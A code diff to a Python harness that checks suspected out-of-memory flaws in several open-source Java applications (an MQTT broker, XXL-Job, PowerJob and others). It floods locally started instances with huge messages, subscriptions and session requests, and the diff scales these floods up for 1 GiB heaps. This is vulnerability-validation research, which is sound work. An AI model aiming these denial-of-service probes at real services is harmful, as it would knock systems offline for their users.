@@ -47,6 +47,35 @@ OOM_MARKERS = (
     "OutOfMemoryError: unable to create native thread",
     "GC overhead limit exceeded",
 )
+MIN_HEAP_OVERRIDE = ""
+
+
+def heap_to_mib(value: str) -> int:
+    text = value.strip().lower()
+    if not text:
+        return 0
+    match = re.fullmatch(r"(\d+)([kmg]?)", text)
+    if not match:
+        raise ValueError(f"unsupported heap value: {value}")
+    amount = int(match.group(1))
+    unit = match.group(2) or "m"
+    if unit == "g":
+        return amount * 1024
+    if unit == "m":
+        return amount
+    if unit == "k":
+        return max(1, amount // 1024)
+    return amount
+
+
+def with_min_heap(default_heap: str) -> str:
+    if not MIN_HEAP_OVERRIDE:
+        return default_heap
+    return MIN_HEAP_OVERRIDE if heap_to_mib(MIN_HEAP_OVERRIDE) > heap_to_mib(default_heap) else default_heap
+
+
+def is_heap_at_least(heap: str, mib: int) -> bool:
+    return heap_to_mib(heap) >= mib
 
 
 @dataclasses.dataclass(frozen=True)
@@ -1443,14 +1472,15 @@ def manual_probe_result(
 
 def run_smqtt_retain(case: Candidate) -> ProbeResult:
     port = 1883
-    heap = "96m"
-    payload = b"A" * 524288
+    heap = with_min_heap("96m")
+    payload = b"A" * ((3584 * 1024) if is_heap_at_least(heap, 1024) else 524288)
+    max_messages = 520 if is_heap_at_least(heap, 1024) else 400
     process, handle, log_path = start_smqtt(case, heap, port)
     sent = 0
     try:
         sock = mqtt_connect(port, "p0-retain-publisher", clean_session=True)
         try:
-            for index in range(1, 401):
+            for index in range(1, max_messages + 1):
                 mqtt_publish(sock, f"p0/retain/{index}", payload, retain=True)
                 sent = index
                 if index % 10 == 0:
@@ -1471,6 +1501,7 @@ def run_smqtt_retain(case: Candidate) -> ProbeResult:
                 "port": port,
                 "payloadBytes": len(payload),
                 "estimatedRetainedBytes": sent * len(payload),
+                "maxMessages": max_messages,
                 "clientException": repr(exc),
             },
         )
@@ -1485,6 +1516,7 @@ def run_smqtt_retain(case: Candidate) -> ProbeResult:
             "port": port,
             "payloadBytes": len(payload),
             "estimatedRetainedBytes": sent * len(payload),
+            "maxMessages": max_messages,
             "postProbePortOpen": port_open(port),
         },
     )
@@ -1492,20 +1524,23 @@ def run_smqtt_retain(case: Candidate) -> ProbeResult:
 
 def run_smqtt_offline_queue(case: Candidate) -> ProbeResult:
     port = 1883
-    heap = "96m"
+    heap = with_min_heap("96m")
     topic = "p0/offline/feed"
-    payload = b"B" * 524288
+    payload = b"B" * ((3 * 1024 * 1024) if is_heap_at_least(heap, 1024) else 524288)
+    offline_subscribers = 4 if is_heap_at_least(heap, 1024) else 1
+    max_messages = 180 if is_heap_at_least(heap, 1024) else 400
     process, handle, log_path = start_smqtt(case, heap, port)
     sent = 0
     try:
-        subscriber = mqtt_connect(port, "p0-persistent-offline", clean_session=False)
-        mqtt_subscribe(subscriber, 1, topic, qos=0)
-        drain_socket(subscriber)
-        mqtt_disconnect(subscriber)
+        for sub_index in range(offline_subscribers):
+            subscriber = mqtt_connect(port, f"p0-persistent-offline-{sub_index}", clean_session=False)
+            mqtt_subscribe(subscriber, 1, topic, qos=0)
+            drain_socket(subscriber)
+            mqtt_disconnect(subscriber)
         time.sleep(1)
         publisher = mqtt_connect(port, "p0-offline-publisher", clean_session=True)
         try:
-            for index in range(1, 401):
+            for index in range(1, max_messages + 1):
                 mqtt_publish(publisher, topic, payload, retain=False)
                 sent = index
                 if index % 10 == 0:
@@ -1525,7 +1560,9 @@ def run_smqtt_offline_queue(case: Candidate) -> ProbeResult:
                 "heap": heap,
                 "port": port,
                 "payloadBytes": len(payload),
-                "estimatedQueuedBytes": sent * len(payload),
+                "offlineSubscribers": offline_subscribers,
+                "estimatedQueuedBytes": sent * len(payload) * offline_subscribers,
+                "maxMessages": max_messages,
                 "clientException": repr(exc),
             },
         )
@@ -1540,7 +1577,9 @@ def run_smqtt_offline_queue(case: Candidate) -> ProbeResult:
             "port": port,
             "topic": topic,
             "payloadBytes": len(payload),
-            "estimatedQueuedBytes": sent * len(payload),
+            "offlineSubscribers": offline_subscribers,
+            "estimatedQueuedBytes": sent * len(payload) * offline_subscribers,
+            "maxMessages": max_messages,
             "postProbePortOpen": port_open(port),
         },
     )
@@ -1548,14 +1587,15 @@ def run_smqtt_offline_queue(case: Candidate) -> ProbeResult:
 
 def run_smqtt_subscriptions(case: Candidate) -> ProbeResult:
     port = 1883
-    heap = "96m"
+    heap = with_min_heap("96m")
     process, handle, log_path = start_smqtt(case, heap, port)
     sent = 0
-    topic_pad = "x" * 640
+    topic_pad = "x" * (8192 if is_heap_at_least(heap, 1024) else 640)
+    max_subscriptions = 220000 if is_heap_at_least(heap, 1024) else 140000
     try:
         sock = mqtt_connect(port, "p0-subscription-cardinality", clean_session=False)
         try:
-            for index in range(1, 140001):
+            for index in range(1, max_subscriptions + 1):
                 mqtt_subscribe(sock, (index % 65535) or 1, f"p0/sub/{index}/{topic_pad}", qos=0)
                 sent = index
                 if index % 100 == 0:
@@ -1577,6 +1617,7 @@ def run_smqtt_subscriptions(case: Candidate) -> ProbeResult:
                 "heap": heap,
                 "port": port,
                 "topicBytesApprox": len(topic_pad) + 16,
+                "maxSubscriptions": max_subscriptions,
                 "clientException": repr(exc),
             },
         )
@@ -1590,6 +1631,7 @@ def run_smqtt_subscriptions(case: Candidate) -> ProbeResult:
             "heap": heap,
             "port": port,
             "topicBytesApprox": len(topic_pad) + 16,
+            "maxSubscriptions": max_subscriptions,
             "postProbePortOpen": port_open(port),
         },
     )
@@ -1645,7 +1687,7 @@ def post_xxl_trigger(job_id: int, log_id: int, executor_params: str = "") -> int
 
 
 def run_xxl_unique_job_threads(case: Candidate) -> ProbeResult:
-    heap = "160m"
+    heap = with_min_heap("160m")
     user_threads_before = current_user_thread_count()
     nproc_margin = 450
     nproc_limit = user_threads_before + nproc_margin if user_threads_before > 0 else None
@@ -1685,12 +1727,13 @@ def run_xxl_unique_job_threads(case: Candidate) -> ProbeResult:
 
 
 def run_xxl_same_job_queue(case: Candidate) -> ProbeResult:
-    heap = "128m"
+    heap = with_min_heap("128m")
     process, handle, log_path = start_xxl(case, heap)
     sent = 0
     client_exception = ""
-    payload = "Q" * 65536
-    for index in range(1, 3001):
+    payload = "Q" * ((512 * 1024) if is_heap_at_least(heap, 1024) else 65536)
+    max_triggers = 3200 if is_heap_at_least(heap, 1024) else 3000
+    for index in range(1, max_triggers + 1):
         try:
             post_xxl_trigger(1, 300000 + index, payload)
             sent = index
@@ -1712,6 +1755,7 @@ def run_xxl_same_job_queue(case: Candidate) -> ProbeResult:
             "port": 9999,
             "executorParamsBytes": len(payload),
             "estimatedQueuedParamBytes": sent * len(payload),
+            "maxTriggers": max_triggers,
             "clientException": client_exception,
         },
     )
@@ -1719,7 +1763,7 @@ def run_xxl_same_job_queue(case: Candidate) -> ProbeResult:
 
 def run_wangmarket_captcha_sessions(case: Candidate) -> ProbeResult:
     port = 18081
-    heap = "128m"
+    heap = with_min_heap("128m")
     process, handle, log_path = start_wangmarket(case, heap, port)
     sent = 0
     last_status = 0
@@ -1770,7 +1814,7 @@ def run_citrus_captcha_sessions(case: Candidate) -> ProbeResult:
     redis_port = 36381
     mysql_name = "p0-citrus-mysql"
     redis_name = "p0-citrus-redis"
-    heap = "128m"
+    heap = with_min_heap("128m")
     mysql_image = ""
     redis_image = ""
     process: subprocess.Popen[bytes] | None = None
@@ -1807,27 +1851,52 @@ def run_citrus_captcha_sessions(case: Candidate) -> ProbeResult:
         last_status = 0
         last_exception = ""
         set_cookie_count = 0
-        for index in range(1, 20001):
-            sent = index
-            try:
-                status, body, headers = http_request(
-                    f"http://127.0.0.1:{port}/rest/verify/captcha?p0={index}",
-                    headers={"User-Agent": f"p0-citrus/{index}"},
-                    opener=new_cookie_opener(),
-                    timeout=5,
-                )
-                last_status = status
-                if headers.get("Set-Cookie"):
-                    set_cookie_count += 1
-                if status >= 500 and b"OutOfMemoryError" in body:
-                    break
-            except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
-                last_exception = repr(exc)
+        next_index = 0
+        max_requests = 100000 if is_heap_at_least(heap, 1024) else 20000
+        worker_count = 16 if is_heap_at_least(heap, 1024) else 1
+        lock = threading.Lock()
+
+        def worker(worker_id: int) -> None:
+            nonlocal sent, last_status, last_exception, set_cookie_count, next_index
+            while True:
+                with lock:
+                    next_index += 1
+                    index = next_index
+                if index > max_requests or process is None or process.poll() is not None or oom_signal(log_path):
+                    return
+                try:
+                    status, body, headers = http_request(
+                        f"http://127.0.0.1:{port}/rest/verify/captcha?p0={index}",
+                        headers={"User-Agent": f"p0-citrus/{worker_id}/{index}"},
+                        opener=new_cookie_opener(),
+                        timeout=8,
+                    )
+                    with lock:
+                        sent += 1
+                        last_status = status
+                        if headers.get("Set-Cookie"):
+                            set_cookie_count += 1
+                    if status >= 500 and b"OutOfMemoryError" in body:
+                        return
+                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
+                    with lock:
+                        last_exception = repr(exc)
+                    return
+                if index % 200 == 0:
+                    time.sleep(0.005)
+
+        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(worker_count)]
+        for thread in threads:
+            thread.start()
+        deadline = time.monotonic() + (600 if is_heap_at_least(heap, 1024) else 300)
+        while time.monotonic() < deadline:
+            if process.poll() is not None or oom_signal(log_path):
                 break
-            if index % 100 == 0:
-                time.sleep(0.02)
-                if process.poll() is not None or oom_signal(log_path):
-                    break
+            if all(not thread.is_alive() for thread in threads):
+                break
+            time.sleep(0.5)
+        for thread in threads:
+            thread.join(timeout=2)
         return finish_probe(
             case,
             process,
@@ -1845,6 +1914,9 @@ def run_citrus_captcha_sessions(case: Candidate) -> ProbeResult:
                 "redisImage": redis_image,
                 "redisPort": redis_port,
                 "setCookieResponses": set_cookie_count,
+                "workerThreads": worker_count,
+                "maxRequests": max_requests,
+                "largeHeapEnhancedProbe": is_heap_at_least(heap, 1024),
                 "lastHttpStatus": last_status,
                 "clientException": last_exception,
                 "runtimeOption": "citrus.verify.store=session; citrus.verify.enable=true; spring.datasource.multiples.default mirrors primary datasource",
@@ -1867,7 +1939,7 @@ def run_wgcloud_session_growth(case: Candidate) -> ProbeResult:
     port = 18083
     mysql_port = 33306
     mysql_name = "p0-wgcloud-mysql"
-    heap = "128m"
+    heap = with_min_heap("128m")
     mysql_image = ""
     process: subprocess.Popen[bytes] | None = None
     handle: object | None = None
@@ -1962,7 +2034,7 @@ def run_powerjob_body_cache(case: Candidate) -> ProbeResult:
     port = 18084
     mysql_port = 33307
     mysql_name = "p0-powerjob-mysql"
-    heap = "192m"
+    heap = with_min_heap("192m")
     mysql_image = ""
     process: subprocess.Popen[bytes] | None = None
     handle: object | None = None
@@ -1978,7 +2050,7 @@ def run_powerjob_body_cache(case: Candidate) -> ProbeResult:
         sent = 0
         last_status = 0
         client_exception = ""
-        pad = "P" * (16 * 1024 * 1024)
+        pad = "P" * ((96 * 1024 * 1024) if is_heap_at_least(heap, 1024) else (16 * 1024 * 1024))
         payload = json.dumps(
             {
                 "group": "com.p0",
@@ -1993,7 +2065,8 @@ def run_powerjob_body_cache(case: Candidate) -> ProbeResult:
 
         def worker(worker_id: int) -> None:
             nonlocal sent, last_status, client_exception
-            for index in range(1, 25):
+            loops = 10 if is_heap_at_least(heap, 1024) else 25
+            for index in range(1, loops):
                 if process is None or process.poll() is not None or oom_signal(log_path):
                     return
                 try:
@@ -2034,6 +2107,7 @@ def run_powerjob_body_cache(case: Candidate) -> ProbeResult:
                 "mysqlPort": mysql_port,
                 "payloadBytes": len(payload),
                 "workerThreads": len(threads),
+                "largeHeapEnhancedProbe": is_heap_at_least(heap, 1024),
                 "lastHttpStatus": last_status,
                 "clientException": client_exception,
                 "postProbePortOpen": port_open(port),
@@ -2064,7 +2138,7 @@ def run_dcmp_static_map(
     port = 18085 if case.candidate_id == "DCMP-STATIC-0001" else 18086
     mysql_port = 33308 if case.candidate_id == "DCMP-STATIC-0001" else 33309
     mysql_name = "p0-dcmp-mysql-1" if case.candidate_id == "DCMP-STATIC-0001" else "p0-dcmp-mysql-2"
-    heap = "128m"
+    heap = with_min_heap("128m")
     mysql_image = ""
     process: subprocess.Popen[bytes] | None = None
     handle: object | None = None
@@ -2197,7 +2271,7 @@ def run_ryvf_test_user_save(case: Candidate) -> ProbeResult:
     redis_port = 36379
     mysql_name = "p0-ryvf-mysql"
     redis_name = "p0-ryvf-redis"
-    heap = "384m"
+    heap = with_min_heap("384m")
     mysql_image = ""
     redis_image = ""
     process: subprocess.Popen[bytes] | None = None
@@ -2250,10 +2324,12 @@ def run_ryvf_test_user_save(case: Candidate) -> ProbeResult:
         last_status = 0
         last_body = ""
         last_exception = ""
-        pad = "R" * 262144
+        pad = "R" * (131072 if is_heap_at_least(heap, 1024) else 262144)
         lock = threading.Lock()
         next_index = 0
         headers = {"Authorization": f"Bearer {token}"} if token else {}
+        max_requests = 30000 if is_heap_at_least(heap, 1024) else 160000
+        worker_count = 24 if is_heap_at_least(heap, 1024) else 12
 
         def worker(worker_id: int) -> None:
             nonlocal sent, last_status, last_body, last_exception, next_index
@@ -2261,7 +2337,7 @@ def run_ryvf_test_user_save(case: Candidate) -> ProbeResult:
                 with lock:
                     next_index += 1
                     index = next_index
-                if index > 160000 or process is None or process.poll() is not None or oom_signal(log_path):
+                if index > max_requests or process is None or process.poll() is not None or oom_signal(log_path):
                     return
                 try:
                     data = urllib.parse.urlencode(
@@ -2293,7 +2369,7 @@ def run_ryvf_test_user_save(case: Candidate) -> ProbeResult:
                 if index % 200 == 0:
                     time.sleep(0.005)
 
-        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(12)]
+        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(worker_count)]
         for thread in threads:
             thread.start()
         deadline = time.monotonic() + 300
@@ -2327,6 +2403,8 @@ def run_ryvf_test_user_save(case: Candidate) -> ProbeResult:
                 "runtimeDbChange": "sys.account.captchaEnabled=false to exercise authenticated low-privilege P0 path",
                 "runtimeLogbackConfig": rel(RUNTIME_DIR / "ryvf-logback.xml"),
                 "workerThreads": len(threads),
+                "maxRequests": max_requests,
+                "padBytes": len(pad),
                 "lastHttpStatus": last_status,
                 "lastBodyPrefix": last_body,
                 "clientException": last_exception,
@@ -2477,7 +2555,7 @@ def run_smartadmin_codegen(case: Candidate) -> ProbeResult:
     redis_port = 36380
     mysql_name = "p0-smartadmin-mysql"
     redis_name = "p0-smartadmin-redis"
-    heap = "192m"
+    heap = with_min_heap("192m")
     mysql_image = ""
     redis_image = ""
     process: subprocess.Popen[bytes] | None = None
@@ -2657,6 +2735,20 @@ def load_existing_results() -> list[ProbeResult]:
     return [ProbeResult(**row) for row in rows]
 
 
+def strict_true_positive(result: ProbeResult) -> bool:
+    confirmed_failure = (
+        result.true_positive
+        or result.status in {"verified_oom", "verified_service_unavailable"}
+        or result.dynamic_verdict.startswith("confirmed")
+    )
+    if not confirmed_failure:
+        return False
+    try:
+        return heap_to_mib(str(result.heap)) >= 1024
+    except ValueError:
+        return False
+
+
 def merge_results(existing: list[ProbeResult], updates: list[ProbeResult]) -> list[ProbeResult]:
     by_id = {result.candidate_id: result for result in existing}
     by_id.update({result.candidate_id: result for result in updates})
@@ -2678,7 +2770,11 @@ def write_results(results: list[ProbeResult]) -> None:
     OUT_DIR.mkdir(parents=True, exist_ok=True)
     LOG_DIR.mkdir(parents=True, exist_ok=True)
     RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
-    rows = [result_to_dict(result) for result in results]
+    rows = []
+    for result in results:
+        row = result_to_dict(result)
+        row["true_positive"] = strict_true_positive(result)
+        rows.append(row)
     (OUT_DIR / "summary.json").write_text(json.dumps(rows, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
     with (OUT_DIR / "findings.jsonl").open("w", encoding="utf-8") as handle:
         for row in rows:
@@ -2699,21 +2795,23 @@ def write_results(results: list[ProbeResult]) -> None:
         writer = csv.DictWriter(handle, fieldnames=fieldnames)
         writer.writeheader()
         for result in results:
-            writer.writerow({field: getattr(result, field) for field in fieldnames})
+            row = {field: getattr(result, field) for field in fieldnames}
+            row["true_positive"] = strict_true_positive(result)
+            writer.writerow(row)
     (OUT_DIR / "P0_DYNAMIC_VALIDATION_REPORT.md").write_text(render_report(results), encoding="utf-8")
 
 
 def render_report(results: list[ProbeResult]) -> str:
-    verified = [result for result in results if result.true_positive]
+    verified = [result for result in results if strict_true_positive(result)]
     blocked = [result for result in results if result.status == "blocked_environment"]
-    not_confirmed = [result for result in results if not result.true_positive and result.status != "blocked_environment"]
+    not_confirmed = [result for result in results if not strict_true_positive(result) and result.status != "blocked_environment"]
     lines = [
         "# P0 应用级动态验证结果",
         "",
         f"- 生成时间：{time.strftime('%Y-%m-%d %H:%M:%S')}",
         "- 输入清单：`results/applications_static_analysis/_static_validation/all_candidates_dynamic_validation.md` 的 P0 候选",
         "- 输出目录：`results/applications_dynamic_validation/p0/`",
-        "- 真阳性门槛：必须由真实外部协议/HTTP 请求触发目标 JVM OOM；仅资源增长、超时或环境启动失败不提升为真阳性。",
+        "- 真阳性门槛：必须由真实外部协议/HTTP 请求触发目标 JVM OOM，且目标 JVM 堆至少为 1GiB；小堆 OOM、资源增长、超时或环境启动失败不提升为真阳性。",
         "",
         "## 总览",
         "",
@@ -2732,7 +2830,7 @@ def render_report(results: list[ProbeResult]) -> str:
         signal = result.oom_signal or ""
         lines.append(
             f"| `{result.candidate_id}` | `{result.app}` | `{result.status}` | "
-            f"{str(result.true_positive).lower()} | `{signal}` | {result.requests_sent} | {log} |"
+            f"{str(strict_true_positive(result)).lower()} | `{signal}` | {result.requests_sent} | {log} |"
         )
     lines.extend(["", "## 真阳性", ""])
     if verified:
@@ -2804,11 +2902,14 @@ def run_candidates(candidates: list[Candidate], base_results: list[ProbeResult] 
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--case", action="append", default=[], help="P0 candidate id to run; defaults to all")
+    parser.add_argument("--min-heap", default="", help="raise every probe JVM heap to at least this size, e.g. 1g")
     return parser.parse_args()
 
 
 def main() -> int:
+    global MIN_HEAP_OVERRIDE
     args = parse_args()
+    MIN_HEAP_OVERRIDE = args.min_heap
     OUT_DIR.mkdir(parents=True, exist_ok=True)
     LOG_DIR.mkdir(parents=True, exist_ok=True)
     RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
@@ -2819,7 +2920,7 @@ def main() -> int:
     except Exception as exc:
         print(f"application P0 dynamic validation failed: {exc}", file=sys.stderr)
         return 1
-    verified = sum(1 for result in results if result.true_positive)
+    verified = sum(1 for result in results if strict_true_positive(result))
     print(f"wrote {rel(OUT_DIR / 'summary.json')} verified_oom={verified}")
     return 0
 
